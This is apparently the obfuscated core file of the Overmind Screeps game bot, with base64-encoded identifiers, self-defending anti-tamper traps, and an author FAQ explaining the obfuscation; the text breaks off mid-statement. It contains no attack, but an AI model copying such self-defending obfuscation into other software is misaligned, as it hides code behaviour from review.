var _0x1cc2=['c2FtcGxl','bGVuZ3Ro','bWVtb3J5','T3Zlcm1pbmQ=','b3ZlcnNlZXI=','c2hvdWxkQnVpbGQ=','ZXhwaXJhdGlvbg==','dGltZQ==','Y2FjaGU=','Y29sb25pZXM=','ZGlyZWN0aXZlcw==','emVyZw==','b3ZlcmxvcmRz','c3Bhd25Hcm91cHM=','Y29sb255TWFw','dGVybWluYWxOZXR3b3Jr','bWFrZVRlcm1pbmFsTmV0d29yaw==','dHJhZGVOZXR3b3Jr','ZXhwYW5zaW9uUGxhbm5lcg==','ZXhjZXB0aW9ucw==','YnVpbGQ=','ZGVidWc=','UmVidWlsZGluZyBPdmVybWluZCBvYmplY3Qh','cmVnaXN0ZXJDb2xvbmllcw==','Zm9yRWFjaA==','c3Bhd25Nb2FyT3ZlcmxvcmRz','cmVnaXN0ZXJEaXJlY3RpdmVz','cmVmcmVzaA==','cmVmcmVzaENvbG9uaWVz','cmVmcmVzaERpcmVjdGl2ZXM=','dHJ5','bmFtZQ==','Q2F1Z2h0IHVuaGFuZGxlZCBleGNlcHRpb24gYXQg','IChpZGVudGlmaWVyOiA=','KTogCg==','c3RhY2s=','OiAK','cHVzaA==','aGFuZGxlRXhjZXB0aW9ucw==','d2FybmluZw==','RXhjZXB0aW9ucyBwcmVzZW50IHRoaXMgdGljayEgUmVidWlsZGluZyBPdmVybWluZCBvYmplY3QgaW4gbmV4dCB0aWNrLg==','c3RhdHM=','cGVyc2lzdGVudA==','bGFzdEVycm9yVGljaw==','Zmlyc3Q=','dGhyb3c=','TXVsdGlwbGUgZXhjZXB0aW9ucyBjYXVnaHQgdGhpcyB0aWNrIQ==','bWFw','am9pbg==','Y29udHJvbGxlcg==','bGV2ZWw=','dGVybWluYWw=','Z3JvdXBCeQ==','b3V0cG9zdEZsYWdz','c3VzcGVuZA==','bm90aWZpZXI=','YWxlcnQ=','Q29sb255IHN1c3BlbmRlZA==','SGlnaA==','ZmxhZ3M=','c2V0UG9zaXRpb24=','cm9vbU5hbWU=','cG9z','U3VwcHJlc3NpbmcgaW5zdGFudGlhdGlvbiBvZiBjb2xvbnkg','Q2F1Z2h0IHVuaGFuZGxlZCBleGNlcHRpb24gaW5zdGFudGlhdGluZyBjb2xvbnkg','Q2F1Z2h0IHVuaGFuZGxlZCBleGNlcHRpb24gcmVmcmVzaGluZyBjb2xvbnkg','RmxhZyBb','IEAg','cHJpbnQ=','XSBkb2VzIG5vdCBtYXRjaCA=','YSB2YWxpZCBkaXJlY3RpdmUgY29sb3IgY29kZSEgKFJlZmVyIHRvIC9zcmMvZGlyZWN0aXZlcy9pbml0aWFsaXplci50cyk=','VXNlIHJlbW92ZUVycmFudEZsYWdzKCkgdG8gcmVtb3ZlIGZsYWdzIHdoaWNoIGRvIG5vdCBtYXRjaCBhIGRpcmVjdGl2ZS4=','aW5pdA==','Y3B1','Z2V0VXNlZA==','bG9n','Y3B1LnVzYWdlLg==','LmluaXQ=','cnVu','cG9zdFJ1bg==','dmlzdWFscw==','YnVja2V0','bmV3ZXN0VmVyc2lvbg==','aXNWZXJzaW9uT3V0ZGF0ZWQ=','WyFdIFVwZGF0ZSBhdmFpbGFibGU6IA==','IOKGkiA=','aW5mbw==','Q1BVIGJ1Y2tldCBpcyB0b28gbG93ICg=','KSAtIHNraXAgcmVuZGVyaW5nIHZpc3VhbHMu','cnVuUm9vbUludGVsXzE=','ZGVmY29u','Y3JlZXBz','c2lnbmVkQnlTY3JlZXBz','c2lnbg==','dGV4dA==','dG9Mb3dlckNhc2U=','aW5jbHVkZXM=','b3Zlcm1pbmQ=','4bSP4bSg4bSHyoDhtI3Jqsm04bSF','dW5kZWZpbmVk','c2V0dGluZ3M=','c2lnbmF0dXJl','SW52YWxpZCBjb250cm9sbGVyIHNpZ25hdHVyZXMgZGV0ZWN0ZWQ6','U2lnbmF0dXJlcyBtdXN0IGNvbnRhaW4gdGhlIHN0cmluZyAiT3Zlcm1pbmQiIG9yIA==','SW52YWxpZCBjb250cm9sbGVyIHNpZ25hdHVyZXMgZGV0ZWN0ZWQ7IHdvbid0IHJ1biB0aGlzIHRpY2sh','cnVuUm9vbUludGVsXzI=','aXNBc3NpbWlsYXRlZA==','Y29sb3I=','c2Vjb25kYXJ5Q29sb3I=','d3JhcA==','dmVyc2lvblVwZGF0ZXI=','c2xhdmVfZmV0Y2hWZXJzaW9u','Q2hlY2tGcmVxdWVuY3k=','Q2hlY2tPblRpY2s=','cmVxdWVzdEZvcmVpZ25TZWdtZW50','VmVyc2lvblNlZ21lbnQ=','Z2V0Rm9yZWlnblNlZ21lbnQ=','dmVyc2lvbg==','c3BsaXQ=','bWFzdGVyX3B1c2hWZXJzaW9u','cmVxdWVzdFNlZ21lbnRz','bWFya1NlZ21lbnRBc1B1YmxpYw==','c2V0U2VnbWVudFByb3BlcnR5','Z2VuZXJhdGVVcGRhdGVNZXNzYWdl','PGEgaHJlZj0iaHR0cHM6Ly9naXRodWIuY29tL2JlbmNiYXJ0bGV0dC9PdmVybWluZC9yZWxlYXNlcyI+RG93bmxvYWQ8L2E+','PGEgaHJlZj0iaHR0cHM6Ly9naXRodWIuY29tL2JlbmNiYXJ0bGV0dC9PdmVybWluZC9ibG9iL21hc3Rlci9DSEFOR0VMT0cubWQiPlBhdGNoIG5vdGVzPC9hPg==','4pWU4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWXCg==','4pWRICAgICAgICAgICAgVXBkYXRlIGF2YWlsYWJsZTog','ICAgICAgICAgICAgICDilZEK','4pWRICAgICAgICAgICAgPiA=','IDwgICAgPiA=','IDwgICAgICAgICAgICAgIOKVkQo=','4pWa4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWd','Z2VuZXJhdGVVcGRhdGVNZXNzYWdlU21hbGw=','4pWU4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWXCg==','4pWRICAgICAgIE9WRVJNSU5EIFNDUkVFUFMgQUkgICAgICAg4pWRCg==','4pWg4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWjCg==','4pWRIFVwZGF0ZSBhdmFpbGFibGU6IA==','IOKVkQo=','4pWRID4g','IDwg4pWRCg==','4pWa4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWd','ZGlzcGxheVVwZGF0ZU1lc3NhZ2U=','PGZvbnQgY29sb3I9JyNmZjAwZmYnPg==','PC9mb250Pg==','c2F5VXBkYXRlTWVzc2FnZQ==','c2F5','VXBkYXRlIG1lIQ==','bm90aWZ5TmV3VmVyc2lvbg==','bm90aWZ5','ZmlsdGVy','a2V5cw==','cm9vbXM='];(function(_0x19a6f6,_0x2a7d8e){var _0x4a2053=function(_0x3c30aa){while(--_0x3c30aa){_0x19a6f6['push'](_0x19a6f6['shift']());}};var _0x3e2555=function(){var _0x3213e8={'data':{'key':'cookie','value':'timeout'},'setCookie':function(_0xdf3776,_0x353885,_0x47228a,_0x6d1b45){_0x6d1b45=_0x6d1b45||{};var _0x41261c=_0x353885+'='+_0x47228a;var _0x7293ab=0x0;for(var _0x7293ab=0x0,_0x336bad=_0xdf3776['length'];_0x7293ab<_0x336bad;_0x7293ab++){var _0x129f5a=_0xdf3776[_0x7293ab];_0x41261c+=';\x20'+_0x129f5a;var _0x275428=_0xdf3776[_0x129f5a];_0xdf3776['push'](_0x275428);_0x336bad=_0xdf3776['length'];if(_0x275428!==!![]){_0x41261c+='='+_0x275428;}}_0x6d1b45['cookie']=_0x41261c;},'removeCookie':function(){return 'dev';},'getCookie':function(_0x563d86,_0x4c268d){_0x563d86=_0x563d86||function(_0x1a8f66){return _0x1a8f66;};var _0x1ea238=_0x563d86(new RegExp('(?:^|;\x20)'+_0x4c268d['replace'](/([.$?*|{}()[]\/+^])/g,'$1')+'=([^;]*)'));var _0x82e67e=function(_0x53b772,_0x29f0d5){_0x53b772(++_0x29f0d5);};_0x82e67e(_0x4a2053,_0x2a7d8e);return _0x1ea238?decodeURIComponent(_0x1ea238[0x1]):undefined;}};var _0x56012f=function(){var _0x2a0b70=new RegExp('\x5cw+\x20*\x5c(\x5c)\x20*{\x5cw+\x20*[\x27|\x22].+[\x27|\x22];?\x20*}');return _0x2a0b70['test'](_0x3213e8['removeCookie']['toString']());};_0x3213e8['updateCookie']=_0x56012f;var _0x5433bf='';var _0x8cfcc6=_0x3213e8['updateCookie']();if(!_0x8cfcc6){_0x3213e8['setCookie'](['*'],'counter',0x1);}else if(_0x8cfcc6){_0x5433bf=_0x3213e8['getCookie'](null,'counter');}else{_0x3213e8['removeCookie']();}};_0x3e2555();}(_0x1cc2,0x1c8));var _0x9e16=function(_0x2443cd,_0x2cdee3){_0x2443cd=_0x2443cd-0x0;var _0x17552d=_0x1cc2[_0x2443cd];if(_0x9e16['vfMSax']===undefined){(function(){var _0x48415d;try{var _0x219619=Function('return\x20(function()\x20'+'{}.constructor(\x22return\x20this\x22)(\x20)'+');');_0x48415d=_0x219619();}catch(_0xca4097){_0x48415d=window;}var _0x18c349='ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=';_0x48415d['atob']||(_0x48415d['atob']=function(_0x2852a0){var _0x323c95=String(_0x2852a0)['replace'](/=+$/,'');for(var _0x28a37a=0x0,_0x162bd0,_0x210234,_0x277c29=0x0,_0x404cc1='';_0x210234=_0x323c95['charAt'](_0x277c29++);~_0x210234&&(_0x162bd0=_0x28a37a%0x4?_0x162bd0*0x40+_0x210234:_0x210234,_0x28a37a++%0x4)?_0x404cc1+=String['fromCharCode'](0xff&_0x162bd0>>(-0x2*_0x28a37a&0x6)):0x0){_0x210234=_0x18c349['indexOf'](_0x210234);}return _0x404cc1;});}());_0x9e16['BySIMk']=function(_0x572858){var _0x2074fb=atob(_0x572858);var _0x25b06a=[];for(var _0x1bec99=0x0,_0x220a97=_0x2074fb['length'];_0x1bec99<_0x220a97;_0x1bec99++){_0x25b06a+='%'+('00'+_0x2074fb['charCodeAt'](_0x1bec99)['toString'](0x10))['slice'](-0x2);}return decodeURIComponent(_0x25b06a);};_0x9e16['CkEecZ']={};_0x9e16['vfMSax']=!![];}var _0x3b8e87=_0x9e16['CkEecZ'][_0x2443cd];if(_0x3b8e87===undefined){var _0x276213=function(_0x17ee87){this['TQoMbA']=_0x17ee87;this['aFOgGy']=[0x1,0x0,0x0];this['QjHgXm']=function(){return 'newState';};this['wRMnxK']='\x5cw+\x20*\x5c(\x5c)\x20*{\x5cw+\x20*';this['KgBqhd']='[\x27|\x22].+[\x27|\x22];?\x20*}';};_0x276213['prototype']['AXzFob']=function(){var _0x496b46=new RegExp(this['wRMnxK']+this['KgBqhd']);var _0x16221a=_0x496b46['test'](this['QjHgXm']['toString']())?--this['aFOgGy'][0x1]:--this['aFOgGy'][0x0];return this['eCZogc'](_0x16221a);};_0x276213['prototype']['eCZogc']=function(_0x44b65b){if(!Boolean(~_0x44b65b)){return _0x44b65b;}return this['ztnGaZ'](this['TQoMbA']);};_0x276213['prototype']['ztnGaZ']=function(_0xba3887){for(var _0x472e13=0x0,_0x5687ab=this['aFOgGy']['length'];_0x472e13<_0x5687ab;_0x472e13++){this['aFOgGy']['push'](Math['round'](Math['random']()));_0x5687ab=this['aFOgGy']['length'];}return _0xba3887(this['aFOgGy'][0x0]);};new _0x276213(_0x9e16)['AXzFob']();_0x17552d=_0x9e16['BySIMk'](_0x17552d);_0x9e16['CkEecZ'][_0x2443cd]=_0x17552d;}else{_0x17552d=_0x3b8e87;}return _0x17552d;};var _0x43ca5a=function(){var _0x2989ff=!![];return function(_0x1c8959,_0x5da22a){var _0x37c1d1=_0x2989ff?function(){if(_0x5da22a){var _0x17f162=_0x5da22a['apply'](_0x1c8959,arguments);_0x5da22a=null;return _0x17f162;}}:function(){};_0x2989ff=![];return _0x37c1d1;};}();var _0x24994f=_0x43ca5a(undefined,function(){var _0x1e692d=function(){return '\x64\x65\x76';},_0x29f50b=function(){return '\x77\x69\x6e\x64\x6f\x77';};var _0x261c6a=function(){var _0x27cd82=new RegExp('\x5c\x77\x2b\x20\x2a\x5c\x28\x5c\x29\x20\x2a\x7b\x5c\x77\x2b\x20\x2a\x5b\x27\x7c\x22\x5d\x2e\x2b\x5b\x27\x7c\x22\x5d\x3b\x3f\x20\x2a\x7d');return !_0x27cd82['\x74\x65\x73\x74'](_0x1e692d['\x74\x6f\x53\x74\x72\x69\x6e\x67']());};var _0xf87d3d=function(){var _0x2f8eeb=new RegExp('\x28\x5c\x5c\x5b\x78\x7c\x75\x5d\x28\x5c\x77\x29\x7b\x32\x2c\x34\x7d\x29\x2b');return _0x2f8eeb['\x74\x65\x73\x74'](_0x29f50b['\x74\x6f\x53\x74\x72\x69\x6e\x67']());};var _0x1723d2=function(_0x270d88){var _0x303f47=~-0x1>>0x1+0xff%0x0;if(_0x270d88['\x69\x6e\x64\x65\x78\x4f\x66']('\x69'===_0x303f47)){_0x43ddd7(_0x270d88);}};var _0x43ddd7=function(_0x538d82){var _0x16f700=~-0x4>>0x1+0xff%0x0;if(_0x538d82['\x69\x6e\x64\x65\x78\x4f\x66']((!![]+'')[0x3])!==_0x16f700){_0x1723d2(_0x538d82);}};if(!_0x261c6a()){if(!_0xf87d3d()){_0x1723d2('\x69\x6e\x64\u0435\x78\x4f\x66');}else{_0x1723d2('\x69\x6e\x64\x65\x78\x4f\x66');}}else{_0x1723d2('\x69\x6e\x64\u0435\x78\x4f\x66');}});_0x24994f();// javascript-obfuscator:disable
//
// Overmind_obfuscated.js: this file is intentially obfuscated to prevent tampering.
//
// Q: Why is this file obfuscated?
//
// A: Using Overmind as your AI puts you at a huge advantage if you are a new player in a novice zone. Screeps has
//    always had problems with people downloading bots from the internet and stomping new players. I have kept Overmind
//    open-sourced because I think it can be a good resource for learning how to play Screeps, but I don't want it to
//    be abused as a noob-crushing machine. In the future, I will be implementing behavioral locks in this file which
//    limit unreasonable aggression toward peaceful new players.
//
// Q: What kind of behavioral locks?
//
// A: Players will be able to opt out of aggression by setting a property in their public memory. Overmind bots will not
//    attack the player unless they attack you, claim a room in Overmind's territory, or occupy a room which is
//    critically important (for example, very desirable mineral deposits that aren't available elsewhere). Overmind
//    will attempt to expand around players which pose no threat to it rather than eliminating them.
//
// Q: What does this file do?
//
// A: The Overmind object is the top-level initializer of the AI and instantiates all colonies and directives. It is
//    also responsible for some high-level decision making. You can see the enumerated properties of the Overmind class
//    in IOvermind in declarations/index.d.ts. Since this file is sufficiently complex and is critical for the AI to be
//    able to run, it was a natural choice of location to put code which should be tamper-resistant.
//
// Q: What happens if I modify this code?
//
// A: This code is self-defending, so any modification to it will likely break the script.
//
// Q: I would like to view the original source code for this file.
//
// A: If you have a compelling reason that you'd like to see the non-obfuscated source for this file, message me in
//    game, on slack, or send me an email at benbartlett@stanford.edu.
//
var __decorate$1=undefined&&undefined.__decorate||function(decorators,target,key,desc){var c=arguments.length,r=c<3?target:desc===null?desc=Object.getOwnPropertyDescriptor(target,key):desc,d;if(typeof Reflect==='object'&&typeof Reflect.decorate==='function')r=Reflect.decorate(decorators,target,key,desc);else for(var i=decorators.length-1;i>=0;i--)if(d=decorators[i])r=(c<3?d(r):c>3?d(target,key,r):d(target,key))||r;return c>3&&r&&Object.defineProperty(target,key,r),r;};const profilerRooms={};if(USE_PROFILER){for(const name of PROFILER_INCLUDE_COLONIES){profilerRooms[name]=!![];}const myRoomNames=_[_0x9e16('0x0')](_[_0x9e16('0x1')](Game[_0x9e16('0x2')]),_0x15b99f=>Game[_0x9e16('0x2')][_0x15b99f]&&Game[_0x9e16('0x2')][_0x15b99f]['my']);for(const name of _[_0x9e16('0x3')](myRoomNames,PROFILER_COLONY_LIMIT-PROFILER_INCLUDE_COLONIES[_0x9e16('0x4')])){profilerRooms[name]=!![];}}let _Overmind=class _Overmind{constructor(){this[_0x9e16('0x5')]=Memory[_0x9e16('0x6')];this[_0x9e16('0x7')]=new Overseer();this[_0x9e16('0x8')]=!![];this[_0x9e16('0x9')]=Game[_0x9e16('0xa')]+NEW_OVERMIND_INTERVAL;this[_0x9e16('0xb')]=new GameCache();this[_0x9e16('0xc')]={};this[_0x9e16('0xd')]={};this[_0x9e16('0xe')]={};this[_0x9e16('0xf')]={};this[_0x9e16('0x10')]={};this[_0x9e16('0x11')]={};this[_0x9e16('0x12')]=this[_0x9e16('0x13')]();this[_0x9e16('0x14')]=new TraderJoe();this[_0x9e16('0x15')]=new ExpansionPlanner();this[_0x9e16('0x16')]=[];}[_0x9e16('0x17')](){log[_0x9e16('0x18')](_0x9e16('0x19'));this[_0x9e16('0xb')][_0x9e16('0x17')]();this[_0x9e16('0x1a')]();_[_0x9e16('0x1b')](this[_0x9e16('0xc')],_0x1735ae=>_0x1735ae[_0x9e16('0x1c')]());this[_0x9e16('0x1d')]();_[_0x9e16('0x1b')](this[_0x9e16('0xd')],_0x912fc0=>_0x912fc0[_0x9e16('0x1c')]());this[_0x9e16('0x8')]=![];}[_0x9e16('0x1e')](){this[_0x9e16('0x8')]=!![];this[_0x9e16('0x5')]=Memory[_0x9e16('0x6')];this[_0x9e16('0x16')]=[];this[_0x9e16('0xb')][_0x9e16('0x1e')]();this[_0x9e16('0x7')][_0x9e16('0x1e')]();this[_0x9e16('0x12')][_0x9e16('0x1e')]();this[_0x9e16('0x14')][_0x9e16('0x1e')]();this[_0x9e16('0x15')][_0x9e16('0x1e')]();this[_0x9e16('0x1f')]();this[_0x9e16('0x20')]();for(const _0x3d642a in this[_0x9e16('0xf')]){this[_0x9e16('0xf')][_0x3d642a][_0x9e16('0x1e')]();}for(const _0x59bd84 in this[_0x9e16('0x10')]){this[_0x9e16('0x10')][_0x59bd84][_0x9e16('0x1e')]();}this[_0x9e16('0x8')]=![];}[_0x9e16('0x21')](_0x114412,_0x1bda8b){if(USE_TRY_CATCH){try{_0x114412();}catch(_0x3a5d72){if(_0x1bda8b){_0x3a5d72[_0x9e16('0x22')]=_0x9e16('0x23')+(''+_0x114412)+_0x9e16('0x24')+_0x1bda8b+_0x9e16('0x25')+_0x3a5d72[_0x9e16('0x22')]+'\x0a'+_0x3a5d72[_0x9e16('0x26')];}else{_0x3a5d72[_0x9e16('0x22')]=_0x9e16('0x23')+(''+_0x114412)+_0x9e16('0x27')+_0x3a5d72[_0x9e16('0x22')]+'\x0a'+_0x3a5d72[_0x9e16('0x26')];}this[_0x9e16('0x16')][_0x9e16('0x28')](_0x3a5d72);}}else{_0x114412();}}[_0x9e16('0x29')](){if(this[_0x9e16('0x16')][_0x9e16('0x4')]==0x0){return;}else{log[_0x9e16('0x2a')](_0x9e16('0x2b'));Memory[_0x9e16('0x2c')][_0x9e16('0x2d')][_0x9e16('0x2e')]=Game[_0x9e16('0xa')];this[_0x9e16('0x8')]=!![];this[_0x9e16('0x9')]=Game[_0x9e16('0xa')];if(this[_0x9e16('0x16')][_0x9e16('0x4')]==0x1){throw _[_0x9e16('0x2f')](this[_0x9e16('0x16')]);}else{for(const _0x2343dd of this[_0x9e16('0x16')]){log[_0x9e16('0x30')](_0x2343dd);}const _0x35c82d=new Error(_0x9e16('0x31'));_0x35c82d[_0x9e16('0x26')]=_[_0x9e16('0x32')](this[_0x9e16('0x16')],_0x5473ed=>_0x5473ed[_0x9e16('0x22')])[_0x9e16('0x33')]('\x0a');throw _0x35c82d;}}}[_0x9e16('0x13')](){const _0x59b161=[];for(const _0x2f49d8 in Game[_0x9e16('0x2')]){if(USE_PROFILER&&!profilerRooms[_0x2f49d8])continue;const _0x83e0ef=Game[_0x9e16('0x2')][_0x2f49d8];if(_0x83e0ef['my']&&_0x83e0ef[_0x9e16('0x34')][_0x9e16('0x35')]>=0x6&&_0x83e0ef[_0x9e16('0x36')]&&_0x83e0ef[_0x9e16('0x36')]['my']){_0x59b161[_0x9e16('0x28')](_0x83e0ef[_0x9e16('0x36')]);}}return new TerminalNetwork(_0x59b161);}[_0x9e16('0x1a')](){const _0x99b320={};this[_0x9e16('0x11')]={};const _0x25b837=_[_0x9e16('0x37')](this[_0x9e16('0xb')][_0x9e16('0x38')],_0x4864bd=>_0x4864bd[_0x9e16('0x5')]['C']);for(const _0x4be59a in Game[_0x9e16('0x2')]){if(Game[_0x9e16('0x2')][_0x4be59a]['my']){const _0x91b52f=Memory[_0x9e16('0xc')][_0x4be59a];if(_0x91b52f&&_0x91b52f[_0x9e16('0x39')]){this[_0x9e16('0x7')][_0x9e16('0x3a')][_0x9e16('0x3b')](_0x9e16('0x3c'),_0x4be59a,NotifierPriority[_0x9e16('0x3d')]);continue;}if(Game[_0x9e16('0x2')][_0x4be59a][_0x9e16('0x3e')]){_0x99b320[_0x4be59a]=_[_0x9e16('0x32')](_0x25b837[_0x4be59a],_0x2cf1b0=>_0x2cf1b0[_0x9e16('0x5')][_0x9e16('0x3f')]?derefRoomPosition(_0x2cf1b0[_0x9e16('0x5')][_0x9e16('0x3f')])[_0x9e16('0x40')]:_0x2cf1b0[_0x9e16('0x41')][_0x9e16('0x40')]);}this[_0x9e16('0x11')][_0x4be59a]=_0x4be59a;}}for(const _0x31d8dc in _0x99b320){for(const _0x78ab2d of _0x99b320[_0x31d8dc]){this[_0x9e16('0x11')][_0x78ab2d]=_0x31d8dc;}}let _0x3d5123=0x0;for(const _0x5dec7d in _0x99b320){if(USE_PROFILER&&!profilerRooms[_0x5dec7d]){if(Game[_0x9e16('0xa')]%0x14==0x0){log[_0x9e16('0x3b')](_0x9e16('0x42')+_0x5dec7d+'.');}continue;}try{this[_0x9e16('0xc')][_0x5dec7d]=new Colony(_0x3d5123,_0x5dec7d,_0x99b320[_0x5dec7d]);}catch(_0x2be08f){_0x2be08f[_0x9e16('0x22')]=_0x9e16('0x43')+_0x5dec7d+_0x9e16('0x27')+_0x2be08f[_0x9e16('0x22')];this[_0x9e16('0x16')][_0x9e16('0x28')](_0x2be08f);}_0x3d5123++;}}[_0x9e16('0x1f')](){for(const _0x3ee798 in this[_0x9e16('0xc')]){try{this[_0x9e16('0xc')][_0x3ee798][_0x9e16('0x1e')]();}catch(_0x2b1bf4){_0x2b1bf4[_0x9e16('0x22')]=_0x9e16('0x44')+_0x3ee798+_0x9e16('0x27')+_0x2b1bf4[_0x9e16('0x22')];this[_0x9e16('0x16')][_0x9e16('0x28')](_0x2b1bf4);}}}[_0x9e16('0x1d')](_0x7bd91=![]){for(const _0x4d31b6 in Game[_0x9e16('0x3e')]){if(this[_0x9e16('0xd')][_0x4d31b6]){continue;}const _0x53d7dd=Game[_0x9e16('0x3e')][_0x4d31b6][_0x9e16('0x5')]['C'];if(_0x53d7dd){if(USE_PROFILER&&!profilerRooms[_0x53d7dd]){continue;}const _0x51f1bf=Memory[_0x9e16('0xc')][_0x53d7dd];if(_0x51f1bf&&_0x51f1bf[_0x9e16('0x39')]){continue;}}const _0x5cd134=DirectiveWrapper(Game[_0x9e16('0x3e')][_0x4d31b6]);const _0x2a3fe2=!!this[_0x9e16('0xd')][_0x4d31b6];if(_0x5cd134&&_0x2a3fe2&&_0x7bd91){_0x5cd134[_0x9e16('0x1c')]();}if(!_0x5cd134&&Game[_0x9e16('0xa')]%0xa==0x0){log[_0x9e16('0x3b')](_0x9e16('0x45')+_0x4d31b6+_0x9e16('0x46')+Game[_0x9e16('0x3e')][_0x4d31b6][_0x9e16('0x41')][_0x9e16('0x47')]+_0x9e16('0x48')+_0x9e16('0x49')+alignedNewline+_0x9e16('0x4a'));}}}[_0x9e16('0x20')](){for(const _0x43ebde in this[_0x9e16('0xd')]){this[_0x9e16('0xd')][_0x43ebde][_0x9e16('0x1e')]();}this[_0x9e16('0x1d')](!![]);}[_0x9e16('0x4b')](){this[_0x9e16('0x21')](()=>this[_0x9e16('0x12')][_0x9e16('0x4b')]());this[_0x9e16('0x21')](()=>this[_0x9e16('0x14')][_0x9e16('0x4b')]());this[_0x9e16('0x7')][_0x9e16('0x4b')]();for(const _0x24fb7d in this[_0x9e16('0xc')]){const _0x10bc23=Game[_0x9e16('0x4c')][_0x9e16('0x4d')]();this[_0x9e16('0x21')](()=>this[_0x9e16('0xc')][_0x24fb7d][_0x9e16('0x4b')](),_0x24fb7d);Stats[_0x9e16('0x4e')](_0x9e16('0x4f')+_0x24fb7d+_0x9e16('0x50'),Game[_0x9e16('0x4c')][_0x9e16('0x4d')]()-_0x10bc23);}for(const _0x4d32b3 in this[_0x9e16('0x10')]){this[_0x9e16('0x21')](()=>this[_0x9e16('0x10')][_0x4d32b3][_0x9e16('0x4b')](),_0x4d32b3);}this[_0x9e16('0x21')](()=>this[_0x9e16('0x15')][_0x9e16('0x4b')]());}[_0x9e16('0x51')](){if(Game[_0x9e16('0xa')]%0x3==0x0){IntelManagement[_0x9e16('0x51')]();}for(const _0x271ad2 in this[_0x9e16('0x10')]){this[_0x9e16('0x21')](()=>this[_0x9e16('0x10')][_0x271ad2][_0x9e16('0x51')](),_0x271ad2);}this[_0x9e16('0x7')][_0x9e16('0x51')]();for(const _0x339ce6 in this[_0x9e16('0xc')]){this[_0x9e16('0x21')](()=>this[_0x9e16('0xc')][_0x339ce6][_0x9e16('0x51')](),_0x339ce6);}if(MY_USERNAME==MUON){for(const _0x51f212 of AllContracts){this[_0x9e16('0x21')](()=>_0x51f212[_0x9e16('0x51')]());}}this[_0x9e16('0x21')](()=>this[_0x9e16('0x12')][_0x9e16('0x51')]());this[_0x9e16('0x21')](()=>this[_0x9e16('0x14')][_0x9e16('0x51')]());this[_0x9e16('0x21')](()=>this[_0x9e16('0x15')][_0x9e16('0x51')]());this[_0x9e16('0x21')](()=>RoomIntel[_0x9e16('0x51')]());this[_0x9e16('0x21')](()=>Assimilator[_0x9e16('0x51')]());}[_0x9e16('0x52')](){this[_0x9e16('0x21')](()=>VersionUpdater[_0x9e16('0x51')]());this[_0x9e16('0x21')](()=>Segmenter[_0x9e16('0x51')]());this[_0x9e16('0x29')]();}[_0x9e16('0x53')](){if(Game[_0x9e16('0x4c')][_0x9e16('0x54')]>0x2328){Visualizer[_0x9e16('0x53')]();if(VersionUpdater[_0x9e16('0x5')][_0x9e16('0x55')]){const _0x458fea=VersionUpdater[_0x9e16('0x5')][_0x9e16('0x55')];if(VersionUpdater[_0x9e16('0x56')](_0x458fea)){this[_0x9e16('0x7')][_0x9e16('0x3a')][_0x9e16('0x3b')](_0x9e16('0x57')+__VERSION__+_0x9e16('0x58')+_0x458fea,undefined,-0x1);}}this[_0x9e16('0x7')][_0x9e16('0x53')]();for(const _0x64d8ea in this[_0x9e16('0xc')]){this[_0x9e16('0xc')][_0x64d8ea][_0x9e16('0x53')]();}}else{if(Game[_0x9e16('0xa')]%0xa==0x0){log[_0x9e16('0x59')](_0x9e16('0x5a')+Game[_0x9e16('0x4c')][_0x9e16('0x54')]+_0x9e16('0x5b'));}}}};_Overmind=__decorate$1([profile,assimilationLocked],_Overmind);var _Overmind$1 = _Overmind;class IntelManagement{static[_0x9e16('0x5c')](){const _0x3ee848=[];const _0x238a99=getAllColonies();if(_0x238a99[_0x9e16('0x4')]==0x0)return;for(const _0x408b57 of _0x238a99){if(_0x408b57[_0x9e16('0x5d')]>0x0||_0x408b57[_0x9e16('0x5e')][_0x9e16('0x4')]==0x0){continue;}const _0x4e5e12=_0x408b57[_0x9e16('0x34')];if(_0x4e5e12[_0x9e16('0x5f')]||_0x4e5e12[_0x9e16('0x35')]<0x4){continue;}let _0x180b13=![];if(_0x4e5e12[_0x9e16('0x60')]){const 